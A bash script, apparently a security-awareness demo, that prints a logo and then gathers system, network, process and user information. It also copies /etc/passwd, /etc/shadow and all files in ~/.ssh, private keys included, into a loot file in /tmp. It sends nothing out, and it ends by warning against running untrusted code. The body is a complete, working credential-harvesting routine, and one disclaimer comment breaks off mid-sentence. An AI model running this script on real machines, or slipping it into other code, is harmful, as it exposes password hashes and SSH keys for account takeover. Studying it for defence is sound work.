# DISCLAIMER: This script is for educational purposes only.
# Any personal or sensitive information found in the loot file is stored in /tmp/loot.txt
# Nothing was actually exfiltrated but just remember that actual attackers would
# Stay safe and happy hacking!

# Color Codes
GREEN='\033[1;32m'
RED='\033[0;31m'

# No Color
NC='\033[0m'

# Spacing
echo ""

# Print Logo
echo "${GREEN}                           ██████████████████████                           ${NC}"
echo "${GREEN}                      ██████                    ██████                      ${NC}"
echo "${GREEN}                   ████                              ████                   ${NC}"
echo "${GREEN}                ████                                    ███                 ${NC}"
echo "${GREEN}       █      ███  ██████████               ██████████  ██████████          ${NC}"
echo "${GREEN}       ██   ███    ██      ██  ██       ██  ██          ██   █████          ${NC}"
echo "${GREEN}       ██  ██      ██      ██  ██       ██  ██          ██     ███          ${NC}"
echo "${GREEN}       █████       ██      ██  ██       ██  ██          ██      ███         ${NC}"
echo "${GREEN}       ███         ██      ██  ██       ██  ██          ██      ████        ${NC}"
echo "${GREEN}      ███          ██      ██  ██       ██  ██          ██      ██ ██       ${NC}"
echo "${GREEN}      ███          ██      ██  ██       ██  ██          ██      ██  ██      ${NC}"
echo "${GREEN}     ████          ██████████  ███████████  █████████   ██████████   ██     ${NC}"
echo "${GREEN}    ██ ██          ██      ██           ██  ██          ██           ███    ${NC}"
echo "${GREEN}   ███ ██          ██      ██           ██  ██          ██   █        ██    ${NC}"
echo "${GREEN}   ██  ██          ██      ██           ██  ██          ██   ██        ██   ${NC}"
echo "${GREEN}   ██  ██          ██      ██           ██  ██          ██    ██       ██   ${NC}"
echo "${GREEN}  ██   ██          ██      ██           ██  ██          ██    ██       ███  ${NC}"
echo "${GREEN}  ██   ██          ██      ██           ██  ██          ██     ██       ██  ${NC}"
echo "${GREEN}  ██   █████████   ██       █    ███ █████  █████████   ██      █       ██  ${NC}"
echo "${GREEN}  ██                                                                    ██  ${NC}"
echo "${GREEN}  ██    ███████████    ███████████    ████████████   ████████████       ██  ${NC}"
echo "${GREEN}  ██            ██    ███             ██        ██   ██        ██      ███  ${NC}"
echo "${GREEN}   ██          ███    ███             ██        ██   ██        ██      ███  ${NC}"
echo "${GREEN}   ██          ██     ███             ██        ██   ██        ██      ██   ${NC}"
echo "${GREEN}   ███        ███     ███             ██        ██   ██        ██     ███   ${NC}"
echo "${GREEN}    ██        ██      ███             ██        ██   ██        ██     ██    ${NC}"
echo "${GREEN}    ███               ███             ██        ██   ██        ██    ██     ${NC}"
echo "${GREEN}      ██              ████████████    ████████████   ██        ██   ██      ${NC}"
echo "${GREEN}      ███             ███             ██             ██        ██  ███      ${NC}"
echo "${GREEN}       ███  █         ███             ██    █        ██        ██ ███       ${NC}"
echo "${GREEN}         ████         ███             ██    ███      ██        ████         ${NC}"
echo "${GREEN}          ███         ███             ██     ██      ██        ███          ${NC}"
echo "${GREEN}          █████       ███             ██     ███     ██      ████           ${NC}"
echo "${GREEN}         ███  ███     ███             ██      ██     ██    ███ ██           ${NC}"
echo "${GREEN}         ████ █████   ██████ █████    ██       █     ████████████           ${NC}"
echo "${GREEN}                   ███                                ████                  ${NC}"
echo "${GREEN}                      ████                       █████                      ${NC}"
echo "${GREEN}                          ████████       █████████                          ${NC}"
echo "${GREEN}                                  ████████                                  ${NC}"

# Spacing
echo ""

# Begin looting computer
echo "${RED}Looting computer...${NC}"

# Set file name
filename="$(date | base64)-loot"
touch /tmp/$filename

# Grab System Info
echo "${RED}This is the system info${NC}" 2>/dev/null >> /tmp/$filename
uname -a 2>/dev/null >> /tmp/$filename
cat /etc/os-release 2>/dev/null >> /tmp/$filename
echo "" 2>/dev/null >> /tmp/$filename

# Network Info
echo "${RED}This is the network info${NC}" 2>/dev/null >> /tmp/$filename
echo "Public IP Address: $(curl -s https://ifconfig.me)" 2>/dev/null >> /tmp/$filename
echo "" 2>/dev/null >> /tmp/$filename
ifconfig 2>/dev/null >> /tmp/$filename
echo "" 2>/dev/null >> /tmp/$filename
ip addr 2>/dev/null >> /tmp/$filename
echo "" 2>/dev/null >> /tmp/$filename

# Running Processes
echo "${RED}This is the running processes${NC}" 2>/dev/null >> /tmp/$filename 
ps auxf 2>/dev/null >> /tmp/$filename
echo "" 2>/dev/null >> /tmp/$filename

# Users Info
echo "${RED}This is the users info${NC}" 2>/dev/null >> /tmp/$filename
who 2>/dev/null >> /tmp/$filename
w 2>/dev/null >> /tmp/$filename

# Groups Info
echo "${RED}This is the groups info${NC}" 2>/dev/null >> /tmp/$filename
groups 2>/dev/null >> /tmp/$filename

# New line
echo "" 2>/dev/null >> /tmp/$filename

# /etc/passwd
echo "${RED}This is the /etc/passwd file${NC}" 2>/dev/null >> /tmp/$filename
cat /etc/passwd 2>/dev/null >> /tmp/$filename
echo "" 2>/dev/null >> /tmp/$filename

# /etc/shadow
echo "${RED}This is the /etc/shadow file${NC}" 2>/dev/null >> /tmp/$filename
cat /etc/shadow 2>/dev/null >> /tmp/$filename
echo "" 2>/dev/null >> /tmp/$filename

# SSH Keys
echo "${RED}This is the SSH keys${NC}" 2>/dev/null >> /tmp/$filename
cat ~/.ssh/authorized_keys 2>/dev/null >> /tmp/$filename
cat ~/.ssh/* 2>/dev/null >> /tmp/$filename

# End of looting
money='$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$'
echo ""
echo "${RED}${money}${NC}"
echo "Check ${RED}/tmp/$filename${NC} for the loot"
echo "${RED}${money}${NC}"
echo ""
echo "${GREEN}NEVER RUN CODE FROM UNTRUSTED SOURCES BUT IF YOU DO, AUDIT IT FIRST${NC}"
echo ""
echo "Check the loot file to see if there are any valuables there :) - ${RED}@vAnglez${NC}"